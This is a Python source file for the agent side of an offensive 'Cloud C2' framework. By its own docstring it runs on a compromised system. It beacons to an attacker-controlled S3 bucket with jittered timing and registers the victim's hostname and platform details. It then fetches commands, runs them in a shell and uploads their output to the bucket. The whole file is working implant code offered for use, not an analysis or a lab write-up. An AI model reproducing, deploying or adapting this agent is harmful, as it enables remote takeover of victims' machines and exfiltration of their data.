"""
Cloud C2 Agent - Agent-side implementation
"""

import json
import time
import random
import secrets
import subprocess
from datetime import datetime
from .c2 import CloudC2


class CloudC2Agent:
    """
    Cloud C2 Agent
    Runs on compromised system, beacons via S3
    """
    
    def __init__(self, bucket_name, aws_access_key, aws_secret_key, 
                 region='us-east-1', beacon_interval=60, jitter=30):
        """
        Initialize Cloud C2 Agent
        
        Args:
            bucket_name (str): S3 bucket name
            aws_access_key (str): AWS access key
            aws_secret_key (str): AWS secret key
            region (str): AWS region
            beacon_interval (int): Beacon interval in seconds
            jitter (int): Random jitter in seconds
        """
        self.cloud = CloudC2(bucket_name, aws_access_key, aws_secret_key, region)
        self.session_id = secrets.token_hex(8)
        self.beacon_interval = beacon_interval
        self.jitter = jitter
        
        print(f"[*] Cloud C2 Agent initialized")
        print(f"[*] Session ID: {self.session_id}")
        print(f"[*] Beacon interval: {beacon_interval}s ± {jitter}s")
    
    def execute_command(self, command):
        """
        Execute system command
        
        Args:
            command (str): Command to execute
        
        Returns:
            str: Command output
        """
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            output = result.stdout
            if result.stderr:
                output += f"\nErrors:\n{result.stderr}"
            
            return output if output else "Command completed with no output"
        
        except subprocess.TimeoutExpired:
            return "Error: Command timed out (300s)"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def send_beacon(self):
        """
        Send beacon and check for tasks
        
        Returns:
            dict: Task data or None
        """
        try:
            # Check for task file
            task_key = f"tasks/{self.session_id}.json"
            task_data = self.cloud.download_object(task_key)
            
            if task_data:
                # Parse task
                task = json.loads(task_data)
                
                # Delete task file (mark as retrieved)
                self.cloud.delete_object(task_key)
                
                print(f"[*] Task retrieved: {task.get('task_id', 'unknown')}")
                
                return task
            
            return None
        
        except json.JSONDecodeError:
            print(f"[-] Invalid task format")
            return None
        except Exception as e:
            print(f"[-] Beacon error: {e}")
            return None
    
    def submit_result(self, task_id, output):
        """
        Submit command result
        
        Args:
            task_id (str): Task identifier
            output (str): Command output
        
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            result_key = f"results/{self.session_id}-{task_id}.json"
            
            result_data = {
                'session_id': self.session_id,
                'task_id': task_id,
                'output': output,
                'timestamp': datetime.now().isoformat()
            }
            
            success = self.cloud.upload_object(result_key, json.dumps(result_data))
            
            if success:
                print(f"[+] Result submitted: {task_id}")
            else:
                print(f"[-] Failed to submit result: {task_id}")
            
            return success
        
        except Exception as e:
            print(f"[-] Result submission error: {e}")
            return False
    
    def register_session(self):
        """Register agent session with metadata"""
        try:
            import socket
            import platform
            
            session_data = {
                'session_id': self.session_id,
                'hostname': socket.gethostname(),
                'platform': platform.system(),
                'platform_version': platform.version(),
                'architecture': platform.machine(),
                'first_seen': datetime.now().isoformat()
            }
            
            session_key = f"sessions/{self.session_id}.json"
            self.cloud.upload_object(session_key, json.dumps(session_data))
            
            print(f"[+] Session registered")
        
        except Exception as e:
            print(f"[-] Session registration error: {e}")
    
    def update_heartbeat(self):
        """Update last seen timestamp"""
        try:
            heartbeat_key = f"heartbeats/{self.session_id}.txt"
            timestamp = datetime.now().isoformat()
            self.cloud.upload_object(heartbeat_key, timestamp)
        except:
            pass  # Silent failure
    
    def run(self):
        """Main beacon loop"""
        print(f"[*] Starting Cloud C2 agent")
        print(f"[*] Press Ctrl+C to stop")
        print()
        
        # Register session
        self.register_session()
        
        while True:
            try:
                # Update heartbeat
                self.update_heartbeat()
                
                # Send beacon
                task = self.send_beacon()
                
                if task:
                    task_id = task.get('task_id')
                    command = task.get('command')
                    
                    print(f"[*] Executing: {command[:50]}...")
                    
                    # Execute command
                    output = self.execute_command(command)
                    
                    # Submit result
                    self.submit_result(task_id, output)
                
                # Sleep with jitter
                sleep_time = self.beacon_interval + random.randint(-self.jitter, self.jitter)
                time.sleep(max(1, sleep_time))
            
            except KeyboardInterrupt:
                print("\n[!] Agent stopped by user")
                break
            except Exception as e:
                print(f"[-] Agent error: {e}")
                time.sleep(60)